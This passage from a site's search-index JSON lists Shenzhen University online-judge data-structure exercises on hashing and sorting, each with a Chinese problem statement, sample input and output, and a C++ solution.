\u7b2c\u4e09\u884c\u8f93\u5165t\uff0c\u8868\u793a\u8981\u67e5\u627et\u4e2a\u6570\u636e \u4ece\u7b2c\u56db\u884c\u8d77\uff0c\u6bcf\u884c\u8f93\u5165\u4e00\u4e2a\u8981\u67e5\u627e\u7684\u6570\u636e\uff0c\u90fd\u662f\u6b63\u6574\u6570","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1260/#_4","text":"\u6bcf\u884c\u8f93\u51fa\u5bf9\u5e94\u6570\u636e\u7684\u67e5\u627e\u7ed3\u679c\uff0c\u6bcf\u4e2a\u7ed3\u679c\u8868\u793a\u4e3a\u6570\u636e\u6240\u5728\u4f4d\u7f6e[0\uff0c11\uff09\u548c\u67e5\u627e\u6b21\u6570\uff0c\u4e2d\u95f4\u7528\u7a7a\u683c\u5206\u5f00","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1260/#_5","text":"1 2 3 4 5 6 7 8 9 6 11 23 39 48 75 62 6 39 52 52 63 63 52","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1260/#_6","text":"1 2 3 4 5 6 6 1 error 8 1 error 8 2 8 1","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1260/#_7","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1260/#_8","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 #include <iostream> #include <vector> class HashTable { public : HashTable () : hash_ ( P ) {} void insert ( int data ) { int index = data % P ; Node * ptr = & hash_ [ index ]; while ( ptr -> next != NULL ) { ptr = ptr -> next ; } ptr -> next = new Node (); ptr = ptr -> next ; ptr -> data = data ; } void searchOrInsertThenPrint ( int data ) { int result = search ( data ); if ( result == - 1 ) { std :: cout << \"error\" << std :: endl ; insert ( data ); } else { std :: cout << data % P << ' ' << result << std :: endl ; } } int search ( int data ) { int index = data % P ; Node * ptr = & hash_ [ index ]; int count = 0 ; while ( ptr -> next != NULL ) { ptr = ptr -> next ; count += 1 ; if ( ptr -> data == data ) { return count ; } } return - 1 ; } private : static const int P = 11 ; struct Node { int data ; Node * next ; Node () : data (), next ( NULL ) {} }; std :: vector < Node > hash_ ; }; int main () { size_t size ; std :: cin >> size ; class HashTable hashTable ; for ( int i = 0 ; i < size ; ++ i ) { int number ; std :: cin >> number ; hashTable . insert ( number ); } size_t time ; std :: cin >> time ; for ( int i = 0 ; i < time ; ++ i ) { int number ; std :: cin >> number ; hashTable . searchOrInsertThenPrint ( number ); } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1264/","text":"DS\u5185\u6392\u2014\u76f4\u63d2\u6392\u5e8f \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u7ed9\u5b9a\u4e00\u7ec4\u6570\u636e\uff0c\u4f7f\u7528\u76f4\u63d2\u6392\u5e8f\u5b8c\u6210\u6570\u636e\u7684\u5347\u5e8f\u6392\u5e8f\u3002 --\u7a0b\u5e8f\u8981\u6c42-- \u82e5\u4f7f\u7528C++\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6iostream\uff1b\u82e5\u4f7f\u7528C\u8bed\u8a00\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6stdio \u7a0b\u5e8f\u4e2d\u82e5include\u591a\u8fc7\u4e00\u4e2a\u5934\u6587\u4ef6\uff0c\u4e0d\u770b\u4ee3\u7801\uff0c\u4f5c0\u5206\u5904\u7406 \u4e0d\u5141\u8bb8\u4f7f\u7528\u7b2c\u4e09\u65b9\u5bf9\u8c61\u6216\u51fd\u6570\u5b9e\u73b0\u672c\u9898\u7684\u8981\u6c42 \u8f93\u5165 \u6570\u636e\u4e2a\u6570n\uff0cn\u4e2a\u6570\u636e \u8f93\u51fa \u76f4\u63d2\u6392\u5e8f\u7684\u6bcf\u4e00\u8d9f\u6392\u5e8f\u7ed3\u679c \u6837\u4f8b\u8f93\u5165 1 7 34 23 677 2 1 453 3 \u6837\u4f8b\u8f93\u51fa 1 2 3 4 5 6 23 34 677 2 1 453 3 23 34 677 2 1 453 3 2 23 34 677 1 453 3 1 2 23 34 677 453 3 1 2 23 34 453 677 3 1 2 3 23 34 453 677 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include <iostream> #include <vector> int main () { int size ; std :: cin >> size ; std :: vector < int > vector ( static_cast < size_t > ( size )); for ( int i = 0 ; i < size ; ++ i ) { std :: cin >> vector [ i ]; } for ( int i1 = 1 ; i1 < vector . size (); ++ i1 ) { int key = vector [ i1 ]; for ( int i2 = i1 - 1 ; i2 >= 0 ; -- i2 ) { if ( vector [ i2 ] > key ) { vector [ i2 + 1 ] = vector [ i2 ]; vector [ i2 ] = key ; } else { break ; } } std :: cout << vector . front (); for ( int i = 1 ; i < vector . size (); ++ i ) { std :: cout << ' ' << vector [ i ]; } std :: cout << std :: endl ; } return 0 ; }","title":"DS\u5185\u6392\u2014\u76f4\u63d2\u6392\u5e8f"},{"location":"szu_oj/ds/1264/#ds","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u5185\u6392\u2014\u76f4\u63d2\u6392\u5e8f"},{"location":"szu_oj/ds/1264/#_1","text":"\u7ed9\u5b9a\u4e00\u7ec4\u6570\u636e\uff0c\u4f7f\u7528\u76f4\u63d2\u6392\u5e8f\u5b8c\u6210\u6570\u636e\u7684\u5347\u5e8f\u6392\u5e8f\u3002 --\u7a0b\u5e8f\u8981\u6c42-- \u82e5\u4f7f\u7528C++\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6iostream\uff1b\u82e5\u4f7f\u7528C\u8bed\u8a00\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6stdio \u7a0b\u5e8f\u4e2d\u82e5include\u591a\u8fc7\u4e00\u4e2a\u5934\u6587\u4ef6\uff0c\u4e0d\u770b\u4ee3\u7801\uff0c\u4f5c0\u5206\u5904\u7406 \u4e0d\u5141\u8bb8\u4f7f\u7528\u7b2c\u4e09\u65b9\u5bf9\u8c61\u6216\u51fd\u6570\u5b9e\u73b0\u672c\u9898\u7684\u8981\u6c42","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1264/#_2","text":"\u6570\u636e\u4e2a\u6570n\uff0cn\u4e2a\u6570\u636e","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1264/#_3","text":"\u76f4\u63d2\u6392\u5e8f\u7684\u6bcf\u4e00\u8d9f\u6392\u5e8f\u7ed3\u679c","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1264/#_4","text":"1 7 34 23 677 2 1 453 3","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1264/#_5","text":"1 2 3 4 5 6 23 34 677 2 1 453 3 23 34 677 2 1 453 3 2 23 34 677 1 453 3 1 2 23 34 677 453 3 1 2 23 34 453 677 3 1 2 3 23 34 453 677","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1264/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1264/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include <iostream> #include <vector> int main () { int size ; std :: cin >> size ; std :: vector < int > vector ( static_cast < size_t > ( size )); for ( int i = 0 ; i < size ; ++ i ) { std :: cin >> vector [ i ]; } for ( int i1 = 1 ; i1 < vector . size (); ++ i1 ) { int key = vector [ i1 ]; for ( int i2 = i1 - 1 ; i2 >= 0 ; -- i2 ) { if ( vector [ i2 ] > key ) { vector [ i2 + 1 ] = vector [ i2 ]; vector [ i2 ] = key ; } else { break ; } } std :: cout << vector . front (); for ( int i = 1 ; i < vector . size (); ++ i ) { std :: cout << ' ' << vector [ i ]; } std :: cout << std :: endl ; } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1268/","text":"DS\u5185\u6392\u20142-\u8def\u5f52\u5e76\u6392\u5e8f \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u8f93\u5165\u4e00\u7ec4\u5b57\u7b26\u4e32\uff0c\u75282-\u8def\u5f52\u5e76\u6392\u5e8f\u6309\u5b57\u5178\u987a\u5e8f\u8fdb\u884c\u964d\u5e8f\u6392\u5e8f\u3002 \u8f93\u5165 \u6d4b\u8bd5\u6b21\u6570t \u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff1a\u6570\u636e\u4e2a\u6570n\uff0c\u540e\u8ddfn\u4e2a\u5b57\u7b26\u4e32\uff0c\u5b57\u7b26\u4e32\u4e0d\u542b\u7a7a\u683c\u3002 \u8f93\u51fa \u5bf9\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c\u8f93\u51fa2-\u8def\u5f52\u5e76\u6392\u5e8f\u7684\u6bcf\u4e00\u8d9f\u6392\u5e8f\u7ed3\u679c\u3002\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u7684\u8f93\u51fa\u4e4b\u95f4\u67091\u7a7a\u884c\u3002 \u6837\u4f8b\u8f93\u5165 1 2 3 2 6 shenzhen beijing guangzhou futian nanshan baoan 10 apple pear peach grape cherry dew fig haw lemon marc \u6837\u4f8b\u8f93\u51fa 1 2 3 4 5 6 7 8 shenzhen beijing guangzhou futian nanshan baoan shenzhen guangzhou futian beijing nanshan baoan shenzhen nanshan guangzhou futian beijing baoan pear apple peach grape dew cherry haw fig marc lemon pear peach grape apple haw fig dew cherry marc lemon pear peach haw grape fig dew cherry apple marc lemon pear peach marc lemon haw grape fig dew cherry apple \u63d0\u793a \u89e3\u51b3\u65b9\u6848 \u5199\u5f97\u592a\u5dee\u4e86\u90fd\u5feb\u4e0d\u597d\u610f\u601d\u53d1\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #include <iostream> #include <string> #include <vector> int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { int size ; std :: cin >> size ; std :: vector < std :: string > vector ( static_cast < size_t > ( size )); for ( int i = 0 ; i < size ; ++ i ) { std :: cin >> vector [ i ]; } int base = 2 ; while ( base <= size * 2 ) { for ( int i1 = 0 ; i1 < vector . size (); i1 += base ) { for ( int i2 = 0 ; i2 < base - 1 ; ++ i2 ) { for ( int i3 = 0 ; i3 < base - i2 - 1 ; ++ i3 ) { if ( i1 + i3 + 1 >= vector . size ()) { continue ; } if ( vector [ i1 + i3 ] < vector [ i1 + i3 + 1 ]) { std :: swap ( vector [ i1 + i3 ], vector [ i1 + i3 + 1 ]); } } } } std :: cout << vector . front (); for ( int i = 1 ; i < vector . size (); ++ i ) { std :: cout << ' ' << vector [ i ]; } std :: cout << std :: endl ; base *= 2 ; } std :: cout << std :: endl ; } return 0 ; }","title":"DS\u5185\u6392\u20142-\u8def\u5f52\u5e76\u6392\u5e8f"},{"location":"szu_oj/ds/1268/#ds2-","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u5185\u6392\u20142-\u8def\u5f52\u5e76\u6392\u5e8f"},{"location":"szu_oj/ds/1268/#_1","text":"\u8f93\u5165\u4e00\u7ec4\u5b57\u7b26\u4e32\uff0c\u75282-\u8def\u5f52\u5e76\u6392\u5e8f\u6309\u5b57\u5178\u987a\u5e8f\u8fdb\u884c\u964d\u5e8f\u6392\u5e8f\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1268/#_2","text":"\u6d4b\u8bd5\u6b21\u6570t \u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff1a\u6570\u636e\u4e2a\u6570n\uff0c\u540e\u8ddfn\u4e2a\u5b57\u7b26\u4e32\uff0c\u5b57\u7b26\u4e32\u4e0d\u542b\u7a7a\u683c\u3002","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1268/#_3","text":"\u5bf9\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c\u8f93\u51fa2-\u8def\u5f52\u5e76\u6392\u5e8f\u7684\u6bcf\u4e00\u8d9f\u6392\u5e8f\u7ed3\u679c\u3002\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u7684\u8f93\u51fa\u4e4b\u95f4\u67091\u7a7a\u884c\u3002","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1268/#_4","text":"1 2 3 2 6 shenzhen beijing guangzhou futian nanshan baoan 10 apple pear peach grape cherry dew fig haw lemon marc","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1268/#_5","text":"1 2 3 4 5 6 7 8 shenzhen beijing guangzhou futian nanshan baoan shenzhen guangzhou futian beijing nanshan baoan shenzhen nanshan guangzhou futian beijing baoan pear apple peach grape dew cherry haw fig marc lemon pear peach grape apple haw fig dew cherry marc lemon pear peach haw grape fig dew cherry apple marc lemon pear peach marc lemon haw grape fig dew cherry apple","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1268/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1268/#_7","text":"\u5199\u5f97\u592a\u5dee\u4e86\u90fd\u5feb\u4e0d\u597d\u610f\u601d\u53d1\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #include <iostream> #include <string> #include <vector> int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { int size ; std :: cin >> size ; std :: vector < std :: string > vector ( static_cast < size_t > ( size )); for ( int i = 0 ; i < size ; ++ i ) { std :: cin >> vector [ i ]; } int base = 2 ; while ( base <= size * 2 ) { for ( int i1 = 0 ; i1 < vector . size (); i1 += base ) { for ( int i2 = 0 ; i2 < base - 1 ; ++ i2 ) { for ( int i3 = 0 ; i3 < base - i2 - 1 ; ++ i3 ) { if ( i1 + i3 + 1 >= vector . size ()) { continue ; } if ( vector [ i1 + i3 ] < vector [ i1 + i3 + 1 ]) { std :: swap ( vector [ i1 + i3 ], vector [ i1 + i3 + 1 ]); } } } } std :: cout << vector . front (); for ( int i = 1 ; i < vector . size (); ++ i ) { std :: cout << ' ' << vector [ i ]; } std :: cout << std :: endl ; base *= 2 ; } std :: cout << std :: endl ; } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1269/","text":"DS\u54c8\u5e0c\u67e5\u627e\u2014\u7ebf\u6027\u63a2\u6d4b\u518d\u6563\u5217 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u5b9a\u4e49\u54c8\u5e0c\u51fd\u6570\u4e3aH(key) = key%11\u3002\u8f93\u5165\u8868\u957f\uff08\u5927\u4e8e\u3001\u7b49\u4e8e11\uff09\uff0c\u8f93\u5165\u5173\u952e\u5b57\u96c6\u5408\uff0c\u7528\u7ebf\u6027\u63a2\u6d4b\u518d\u6563\u5217\u6784\u5efa\u54c8\u5e0c\u8868\uff0c\u5e76\u67e5\u627e\u7ed9\u5b9a\u5173\u952e\u5b57\u3002 --\u7a0b\u5e8f\u8981\u6c42-- \u82e5\u4f7f\u7528C++\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6iostream\uff1b\u82e5\u4f7f\u7528C\u8bed\u8a00\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6stdio \u7a0b\u5e8f\u4e2d\u82e5include\u591a\u8fc7\u4e00\u4e2a\u5934\u6587\u4ef6\uff0c\u4e0d\u770b\u4ee3\u7801\uff0c\u4f5c0\u5206\u5904\u7406 \u4e0d\u5141\u8bb8\u4f7f\u7528\u7b2c\u4e09\u65b9\u5bf9\u8c61\u6216\u51fd\u6570\u5b9e\u73b0\u672c\u9898\u7684\u8981\u6c42 \u8f93\u5165 \u6d4b\u8bd5\u6b21\u6570t \u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u4e3a\uff1a \u54c8\u5e0c\u8868\u957fm\u3001\u5173\u952e\u5b57\u4e2a\u6570n n\u4e2a\u5173\u952e\u5b57 \u67e5\u627e\u6b21\u6570k k\u4e2a\u5f85\u67e5\u5173\u952e\u5b57 \u8f93\u51fa \u5bf9\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c\u8f93\u51fa\u4ee5\u4e0b\u4fe1\u606f\uff1a \u6784\u9020\u7684\u54c8\u5e0c\u8868\u4fe1\u606f\uff0c\u6570\u7ec4\u4e2d\u6ca1\u6709\u5173\u952e\u5b57\u7684\u4f4d\u7f6e\u8f93\u51faNULL \u5bf9k\u4e2a\u5f85\u67e5\u5173\u952e\u5b57\uff0c\u5206\u522b\u8f93\u51fa\uff1a0\u62161\uff080\u2014\u4e0d\u6210\u529f\uff0c1\u2014\u6210\u529f\uff09\u3001\u6bd4\u8f83\u6b21\u6570\u3001\u67e5\u627e\u6210\u529f\u7684\u4f4d\u7f6e\uff08\u4ece1\u5f00\u59cb\uff09 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 8 1 12 10 22 19 21 8 9 30 33 4 15 14 4 22 56 30 17 \u6837\u4f8b\u8f93\u51fa 1 2 3 4 5 22 30 33 14 4 15 NULL NULL 19 8 21 9 1 1 1 0 6 1 6 2 0 1 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 #include <iostream> #include <vector> class HashTable { public : explicit HashTable ( size_t size ) : hash_ ( size , - 1 ) {} void setFromCin () { size_t length ; std :: cin >> length ; for ( int i = 0 ; i < length ; ++ i ) { int number , index = 0 ; std :: cin >> number ; while ( hash_ [ number % P + index ] != - 1 ) { index += 1 ; if ( number % P + index == hash_ . size ()) { index = - ( number % P ); } } hash_ [ number % P + index ] = number ; } std :: cout << hash_ . front (); for ( int i = 1 ; i < hash_ . size (); ++ i ) { if ( hash_ [ i ] == - 1 ) { std :: cout << \" NULL\" ; } else { std :: cout << ' ' << hash_ [ i ]; } } std :: cout << std :: endl ; } void searchAndPrint ( int data ) { int result = 1 , count = 1 , index = 0 ; while ( hash_ [ data % P + index ] != data ) { if ( count == hash_ . size () || hash_ [ data % P + index ] == - 1 ) { result = 0 ; break ; } index += 1 ; count += 1 ; if ( data % P + index == hash_ . size ()) { index = - ( data % P ); } } std :: cout << result << ' ' << count ; if ( result == 1 ) { int position = data % P + index + 1 ; std :: cout << ' ' << position ; } std :: cout << std :: endl ; } private : static const int P = 11 ; std :: vector < int > hash_ ; }; int main () { size_t ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { size_t size ; std :: cin >> size ; class HashTable hashTable ( size ); hashTable . setFromCin (); int time ; std :: cin >> time ; while ( time -- ) { int number ; std :: cin >> number ; hashTable . searchAndPrint ( number ); } } return 0 ; }","title":"DS\u54c8\u5e0c\u67e5\u627e\u2014\u7ebf\u6027\u63a2\u6d4b\u518d\u6563\u5217"},{"location":"szu_oj/ds/1269/#ds","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u54c8\u5e0c\u67e5\u627e\u2014\u7ebf\u6027\u63a2\u6d4b\u518d\u6563\u5217"},{"location":"szu_oj/ds/1269/#_1","text":"\u5b9a\u4e49\u54c8\u5e0c\u51fd\u6570\u4e3aH(key) = key%11\u3002\u8f93\u5165\u8868\u957f\uff08\u5927\u4e8e\u3001\u7b49\u4e8e11\uff09\uff0c\u8f93\u5165\u5173\u952e\u5b57\u96c6\u5408\uff0c\u7528\u7ebf\u6027\u63a2\u6d4b\u518d\u6563\u5217\u6784\u5efa\u54c8\u5e0c\u8868\uff0c\u5e76\u67e5\u627e\u7ed9\u5b9a\u5173\u952e\u5b57\u3002 --\u7a0b\u5e8f\u8981\u6c42-- \u82e5\u4f7f\u7528C++\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6iostream\uff1b\u82e5\u4f7f\u7528C\u8bed\u8a00\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6stdio \u7a0b\u5e8f\u4e2d\u82e5include\u591a\u8fc7\u4e00\u4e2a\u5934\u6587\u4ef6\uff0c\u4e0d\u770b\u4ee3\u7801\uff0c\u4f5c0\u5206\u5904\u7406 \u4e0d\u5141\u8bb8\u4f7f\u7528\u7b2c\u4e09\u65b9\u5bf9\u8c61\u6216\u51fd\u6570\u5b9e\u73b0\u672c\u9898\u7684\u8981\u6c42","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1269/#_2","text":"\u6d4b\u8bd5\u6b21\u6570t \u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u4e3a\uff1a \u54c8\u5e0c\u8868\u957fm\u3001\u5173\u952e\u5b57\u4e2a\u6570n n\u4e2a\u5173\u952e\u5b57 \u67e5\u627e\u6b21\u6570k k\u4e2a\u5f85\u67e5\u5173\u952e\u5b57","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1269/#_3","text":"\u5bf9\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c\u8f93\u51fa\u4ee5\u4e0b\u4fe1\u606f\uff1a \u6784\u9020\u7684\u54c8\u5e0c\u8868\u4fe1\u606f\uff0c\u6570\u7ec4\u4e2d\u6ca1\u6709\u5173\u952e\u5b57\u7684\u4f4d\u7f6e\u8f93\u51faNULL \u5bf9k\u4e2a\u5f85\u67e5\u5173\u952e\u5b57\uff0c\u5206\u522b\u8f93\u51fa\uff1a0\u62161\uff080\u2014\u4e0d\u6210\u529f\uff0c1\u2014\u6210\u529f\uff09\u3001\u6bd4\u8f83\u6b21\u6570\u3001\u67e5\u627e\u6210\u529f\u7684\u4f4d\u7f6e\uff08\u4ece1\u5f00\u59cb\uff09","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1269/#_4","text":"1 2 3 4 5 6 7 8 1 12 10 22 19 21 8 9 30 33 4 15 14 4 22 56 30 17","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1269/#_5","text":"1 2 3 4 5 22 30 33 14 4 15 NULL NULL 19 8 21 9 1 1 1 0 6 1 6 2 0 1","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1269/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1269/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 #include <iostream> #include <vector> class HashTable { public : explicit HashTable ( size_t size ) : hash_ ( size , - 1 ) {} void setFromCin () { size_t length ; std :: cin >> length ; for ( int i = 0 ; i < length ; ++ i ) { int number , index = 0 ; std :: cin >> number ; while ( hash_ [ number % P + index ] != - 1 ) { index += 1 ; if ( number % P + index == hash_ . size ()) { index = - ( number % P ); } } hash_ [ number % P + index ] = number ; } std :: cout << hash_ . front (); for ( int i = 1 ; i < hash_ . size (); ++ i ) { if ( hash_ [ i ] == - 1 ) { std :: cout << \" NULL\" ; } else { std :: cout << ' ' << hash_ [ i ]; } } std :: cout << std :: endl ; } void searchAndPrint ( int data ) { int result = 1 , count = 1 , index = 0 ; while ( hash_ [ data % P + index ] != data ) { if ( count == hash_ . size () || hash_ [ data % P + index ] == - 1 ) { result = 0 ; break ; } index += 1 ; count += 1 ; if ( data % P + index == hash_ . size ()) { index = - ( data % P ); } } std :: cout << result << ' ' << count ; if ( result == 1 ) { int position = data % P + index + 1 ; std :: cout << ' ' << position ; } std :: cout << std :: endl ; } private : static const int P = 11 ; std :: vector < int > hash_ ; }; int main () { size_t ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { size_t size ; std :: cin >> size ; class HashTable hashTable ( size ); hashTable . setFromCin (); int time ; std :: cin >> time ; while ( time -- ) { int number ; std :: cin >> number ; hashTable . searchAndPrint ( number ); } } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1309/","text":"\u5192\u6ce1\u6392\u5e8f (Ver. I) \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u7ed9\u5b9a\u4e00\u4e2a\u5305\u542b\u4ece0\u5230n-1\u5404\u4e00\u6b21\u7684\u6570\u7ec4\uff0c\u82e5\u4f7f\u7528\u5192\u6ce1\u6392\u5e8f\u5c06\u5176\u6392\u4e3a\u5347\u5e8f\uff0c\u95ee\u5176\u4e2d\u9700\u8981\u8fdb\u884c\u591a\u5c11\u6b21\u4ea4\u6362 \u8f93\u5165 \u6d4b\u8bd5\u6570\u636e\u6709\u591a\u7ec4\uff0c \u6bcf\u7ec4\u7531\u4e24\u884c\u7ec4\u6210\uff1a\u7b2c\u4e00\u884c\u5305\u542b\u6b63\u6574\u6570n\uff08n <= 5000\uff09; \u4e0b\u4e00\u884c\u5305\u542b\u4ece0\u5230n-1\u7684n\u4e2a\u6574\u6570\u7684\u5e8f\u5217\u3002 \u8f93\u51fa \u5bf9\u4e8e\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c \u8f93\u51fa\u4ea4\u6362\u6b21\u6570 \u6837\u4f8b\u8f93\u5165 1 2 10 1 3 6 9 0 8 5 7 4 2 \u6837\u4f8b\u8f93\u51fa 1 22 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include <iostream> #include <vector> int main () { int size ; while ( std :: cin >> size ) { std :: vector < int > vector ( static_cast < size_t > ( size )); for ( int i = 0 ; i < size ; ++ i ) { std :: cin >> vector [ i ]; } int count = 0 ; for ( int i1 = 0 ; i1 < vector . size () - 1 ; ++ i1 ) { for ( int i2 = 0 ; i2 < vector . size () - 1 - i1 ; ++ i2 ) { if ( vector [ i2 ] > vector [ i2 + 1 ]) { std :: swap ( vector [ i2 ], vector [ i2 + 1 ]); count += 1 ; } } } std :: cout << count << std :: endl ; } return 0 ; }","title":"\u5192\u6ce1\u6392\u5e8f (Ver. I)"},{"location":"szu_oj/ds/1309/#ver-i","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"\u5192\u6ce1\u6392\u5e8f (Ver. I)"},{"location":"szu_oj/ds/1309/#_1","text":"\u7ed9\u5b9a\u4e00\u4e2a\u5305\u542b\u4ece0\u5230n-1\u5404\u4e00\u6b21\u7684\u6570\u7ec4\uff0c\u82e5\u4f7f\u7528\u5192\u6ce1\u6392\u5e8f\u5c06\u5176\u6392\u4e3a\u5347\u5e8f\uff0c\u95ee\u5176\u4e2d\u9700\u8981\u8fdb\u884c\u591a\u5c11\u6b21\u4ea4\u6362","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1309/#_2","text":"\u6d4b\u8bd5\u6570\u636e\u6709\u591a\u7ec4\uff0c \u6bcf\u7ec4\u7531\u4e24\u884c\u7ec4\u6210\uff1a\u7b2c\u4e00\u884c\u5305\u542b\u6b63\u6574\u6570n\uff08n <= 5000\uff09; \u4e0b\u4e00\u884c\u5305\u542b\u4ece0\u5230n-1\u7684n\u4e2a\u6574\u6570\u7684\u5e8f\u5217\u3002","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1309/#_3","text":"\u5bf9\u4e8e\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c \u8f93\u51fa\u4ea4\u6362\u6b21\u6570","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1309/#_4","text":"1 2 10 1 3 6 9 0 8 5 7 4 2","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1309/#_5","text":"1 22","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1309/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1309/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include <iostream> #include <vector> int main () { int size ; while ( std :: cin >> size ) { std :: vector < int > vector ( static_cast < size_t > ( size )); for ( int i = 0 ; i < size ; ++ i ) { std :: cin >> vector [ i ]; } int count = 0 ; for ( int i1 = 0 ; i1 < vector . size () - 1 ; ++ i1 ) { for ( int i2 = 0 ; i2 < vector . size () - 1 - i1 ; ++ i2 ) { if ( vector [ i2 ] > vector [ i2 + 1 ]) { std :: swap ( vector [ i2 ], vector [ i2 + 1 ]); count += 1 ; } } } std :: cout << count << std :: endl ; } return 0 ; 